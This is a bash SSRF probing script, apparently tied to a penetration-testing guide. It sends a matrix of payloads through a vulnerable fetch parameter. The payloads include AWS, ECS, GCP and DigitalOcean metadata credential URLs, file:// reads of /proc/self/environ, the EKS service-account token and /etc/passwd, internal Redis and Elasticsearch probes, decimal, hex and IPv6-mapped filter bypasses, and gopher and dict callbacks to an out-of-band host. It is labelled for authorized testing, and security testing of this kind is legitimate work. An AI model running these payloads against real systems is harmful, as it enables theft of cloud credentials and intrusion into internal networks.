#!/usr/bin/env bash
# ssrf_probe.sh — fire a matrix of metadata/internal/bypass payloads at an SSRF sink and
# print status/size/time so you can spot reachable targets and working bypasses (guide §5/§6/§11).
# Watch your OOB host (interactsh/Collaborator) in parallel for blind hits.
#
# AUTHORIZED TESTING ONLY. Read-only probing. Prove creds with `aws sts get-caller-identity` & stop (guide §23).
#
# Usage:
#   ./ssrf_probe.sh "https://target/fetch?url=" YOUR.oast.fun  ["Cookie: x=y"]
#   $1 = sink URL with the param ready for appending   $2 = your OOB host   $3 = optional auth header
set -u
SINK="${1:-}"; OOB="${2:-YOUR.oast.fun}"; AUTH="${3:-}"
[ -z "$SINK" ] && { echo "usage: $0 '<sink_url_with_param=>' <oob_host> [auth_header]"; exit 1; }

# baseline + reachability + obfuscation + metadata + protocols
TARGETS=(
  "http://$OOB/baseline"
  "http://127.0.0.1/"  "http://localhost/"  "http://[::1]/"  "http://0.0.0.0/"
  "http://127.0.0.1:6379/"  "http://127.0.0.1:9200/_cat/indices"  "http://127.0.0.1:8080/"
  "http://169.254.169.254/latest/meta-data/"
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  "http://2852039166/latest/meta-data/"                 # decimal metadata
  "http://0xa9fea9fe/latest/meta-data/"                 # hex metadata
  "http://[::ffff:169.254.169.254]/latest/meta-data/"   # ipv6-mapped
  "http://169.254.169.254.nip.io/latest/meta-data/"     # wildcard dns
  "http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=json"  # GCP one-shot (needs header)
  "http://169.254.169.254/metadata/v1/"                 # DigitalOcean
  "http://169.254.170.2/v2/credentials/"                # AWS ECS/Fargate task-role creds (often the ONLY creds)
  "file:///proc/self/environ"                           # Lambda/container env creds (AWS_*) via file://
  "file:///var/run/secrets/eks.amazonaws.com/serviceaccount/token"   # EKS/IRSA web-identity token
  "file:///etc/hostname"  "file:///etc/passwd"
  "dict://127.0.0.1:6379/INFO"
  "gopher://$OOB:80/_GETtest"                            # gopher acceptance test (watch OOB/nc)
)

echo "[i] sink: $SINK"
echo "[i] watch your OOB host ($OOB) for blind callbacks in parallel."
printf "%-58s %-6s %-8s %s\n" "PAYLOAD" "CODE" "BYTES" "TIME"
echo "--------------------------------------------------------------------------------"
for t in "${TARGETS[@]}"; do
  enc=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$t" 2>/dev/null || echo "$t")
  read -r CODE BYTES TIME < <(curl -s --connect-timeout 5 --max-time 20 -o /tmp/_ssrf_body \
        -w "%{http_code} %{size_download} %{time_total}" ${AUTH:+-H "$AUTH"} "${SINK}${enc}" 2>/dev/null)
  printf "%-58s %-6s %-8s %s\n" "$t" "${CODE:-ERR}" "${BYTES:-0}" "${TIME:-0}"
done
echo "--------------------------------------------------------------------------------"
echo "[i] Differing CODE/BYTES/TIME between internal vs external = a reachability oracle (guide §12)."
echo "[i] If metadata returned creds: run 'aws sts get-caller-identity' to prove them live, then STOP (guide §23)."
rm -f /tmp/_ssrf_body
